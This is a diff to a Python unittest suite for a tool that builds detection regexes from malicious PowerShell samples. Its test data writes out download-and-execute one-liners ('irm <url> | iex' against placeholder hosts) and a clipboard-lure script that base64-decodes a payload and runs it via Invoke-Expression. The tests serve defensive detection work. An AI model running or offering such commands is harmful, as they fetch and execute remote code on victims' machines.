@@ -550,6 +550,78 @@ class PatternTests(unittest.TestCase):
         with self.assertRaisesRegex(ValueError, "does not match"):
             exporter.build_regex_patterns(patterns)
 
+    def test_simple_iex_variants_generate_one_regex_for_future_urls(self):
+        variants = [
+            "irm 'https://one.example/x'|iex;",
+            "(irm 'https://two.example/y')|iex",
+            "IRM https://three.example/z | IEX",
+        ]
+        patterns = exporter.build_patterns([
+            self.entry(str(index), value) for index, value in enumerate(variants)
+        ])
+        regexes = {item["Regex"] for item in exporter.build_regex_patterns(patterns)}
+        self.assertEqual(len(regexes), 1)
+        regex = regexes.pop()
+        self.assertIsNotNone(re.search(regex, 'pwsh -c (IRM "new.example/x") | IEX'))
+        self.assertIsNone(re.search(regex, "irm https://one.example/x -OutFile x"))
+        self.assertIsNone(re.search(regex, "confirm https://one.example/x | iex"))
+
+    def test_wua_values_share_regex_and_keep_execution_structure(self):
+        first = "(irm 'https://one.example/x' -UserAgent 'WUA/adedf1881f' -Headers @{'X-WUA'='adedf1881f'})|iex"
+        second = first.replace("adedf1881f", "b1d0126493").replace("one.example", "two.example")
+        patterns = exporter.build_patterns([self.entry("a", first), self.entry("b", second)])
+        self.assertEqual(len(patterns), 1)
+        regex = exporter.build_regex_patterns(patterns)[0]["Regex"]
+        self.assertIsNotNone(re.search(regex, first.replace("adedf1881f", "1234567890")))
+        self.assertIsNone(re.search(regex, first.replace("|iex", "|Write-Output")))
+        with tempfile.TemporaryDirectory() as directory:
+            output = Path(directory)
+            exporter.write_patterns(output, patterns)
+            before = (output / "patterns.regex.json").read_bytes()
+            new = exporter.build_patterns([
+                self.entry("c", first.replace("adedf1881f", "1234567890")),
+            ])
+            exporter.write_patterns(output, new)
+            self.assertEqual((output / "patterns.regex.json").read_bytes(), before)
+
+    def test_clipboard_normalizes_only_banner_base64_and_sleep_delays(self):
+        first = (
+            'powershell -c "Get-Clipboard";echo "\n ___ / | \n"\n'
+            "Start-Sleep -Milliseconds 541\n$updateloadUrl = '" + "A" * 80 + "'\n"
+            "$bytes=[Convert]::FromBase64String($updateloadUrl)\n"
+            "$clean=[Text.Encoding]::Unicode.GetString($bytes)\n"
+            "Invoke-Expression $clean"
+        )
+        second = first.replace(" ___ / | ", " --- ( ) ").replace("541", "943").replace("A" * 80, "B" * 100)
+        patterns = exporter.build_patterns([self.entry("a", first), self.entry("b", second)])
+        self.assertEqual(len(patterns), 1)
+        regex = exporter.build_regex_patterns(patterns)[0]["Regex"]
+        self.assertIsNone(re.search(regex, first.replace("Invoke-Expression $clean", "Write-Output $clean")))
+        self.assertIsNone(re.search(regex, first.replace("Unicode.GetString", "ASCII.GetString")))
+
+    def test_one_time_consolidation_preserves_unknown_historical_regex(self):
+        old = [
+            self.entry("a", "irm 'https://one.example/x'|iex;"),
+            self.entry("b", "(irm 'https://two.example/x')|iex"),
+        ]
+        patterns = exporter.build_patterns(old)
+        history = [
+            exporter.pattern_regex(item["Pattern"], "Other", consolidate=False)
+            for item in patterns
+        ] + ["historical-only"]
+        with tempfile.TemporaryDirectory() as directory:
+            output = Path(directory)
+            (output / "patterns.json").write_text(json.dumps(patterns), encoding="utf-8")
+            path = output / "patterns.regex.json"
+            path.write_text(json.dumps(history), encoding="utf-8")
+            exporter.write_patterns(output, patterns, consolidate=True)
+            merged = json.loads(path.read_text())
+            self.assertEqual(len(merged), 2)
+            self.assertIn("historical-only", merged)
+            before = path.read_bytes()
+            exporter.write_patterns(output, patterns)
+            self.assertEqual(path.read_bytes(), before)
+
     def test_includes_all_families_singletons_and_long_payloads(self):
         entries = [
             self.entry("a", "irm 'https://a.example/x'|iex"),
@@ -599,32 +671,32 @@ class PatternTests(unittest.TestCase):
         with tempfile.TemporaryDirectory() as directory:
             output = Path(directory)
             exporter.write_patterns(output, patterns)
-            text = (output / "Patterns.txt").read_text(encoding="utf-8")
+            text = (output / "patterns.txt").read_text(encoding="utf-8")
             self.assertEqual(len(text.splitlines()), 1)
             self.assertEqual(json.loads('"' + text.strip() + '"'), patterns[0]["Pattern"])
             self.assertEqual(
-                json.loads((output / "Patterns.json").read_text(encoding="utf-8")),
+                json.loads((output / "patterns.json").read_text(encoding="utf-8")),
                 patterns,
             )
             self.assertEqual(
-                json.loads((output / "Patterns.regex.json").read_text(encoding="utf-8")),
+                json.loads((output / "patterns.regex.json").read_text(encoding="utf-8")),
                 [item["Regex"] for item in exporter.build_regex_patterns(patterns)],
             )
             with patch.object(Path, "write_text") as write:
                 exporter.write_patterns(output, patterns)
                 write.assert_not_called()
             exporter.write_patterns(output, [])
-            self.assertEqual((output / "Patterns.txt").read_text(), "")
-            self.assertEqual(json.loads((output / "Patterns.json").read_text()), [])
+            self.assertEqual((output / "patterns.txt").read_text(), "")
+            self.assertEqual(json.loads((output / "patterns.json").read_text()), [])
             self.assertEqual(
-                json.loads((output / "Patterns.regex.json").read_text()),
+                json.loads((output / "patterns.regex.json").read_text()),
                 [item["Regex"] for item in exporter.build_regex_patterns(patterns)],
             )
 
     def test_regex_history_appends_unique_entries_and_preserves_old_bytes(self):
         with tempfile.TemporaryDirectory() as directory:
             output = Path(directory)
-            path = output / "Patterns.regex.json"
+            path = output / "patterns.regex.json"
             original = '["old", "old"]'
             path.write_text(original, encoding="utf-8")
             exporter.write_patterns(output, [], [{"Regex": "old"}])
@@ -641,13 +713,13 @@ class PatternTests(unittest.TestCase):
         for content in ("bad json", "{}", '[42]', '["["]'):
             with self.subTest(content=content), tempfile.TemporaryDirectory() as directory:
                 output = Path(directory)
-                path = output / "Patterns.regex.json"
+                path = output / "patterns.regex.json"
                 path.write_text(content, encoding="utf-8")
                 with self.assertRaises((ValueError, re.error)):
                     exporter.write_patterns(output, [])
                 self.assertEqual(path.read_text(), content)
-                self.assertFalse((output / "Patterns.json").exists())
-                self.assertFalse((output / "Patterns.txt").exists())
+                self.assertFalse((output / "patterns.json").exists())
+                self.assertFalse((output / "patterns.txt").exists())
 
     def test_export_generates_patterns_from_same_seven_day_set(self):
         with tempfile.TemporaryDirectory() as directory:
@@ -664,7 +736,7 @@ class PatternTests(unittest.TestCase):
                 exporter.export(output, datetime(2026, 11, 13, 12, tzinfo=timezone.utc), 0)
             entries = json.loads((output / "sets" / "7D.json").read_text())
             self.assertEqual(
-                json.loads((output / "Patterns.json").read_text()),
+                json.loads((output / "patterns.json").read_text()),
                 exporter.build_patterns(entries),
             )
 
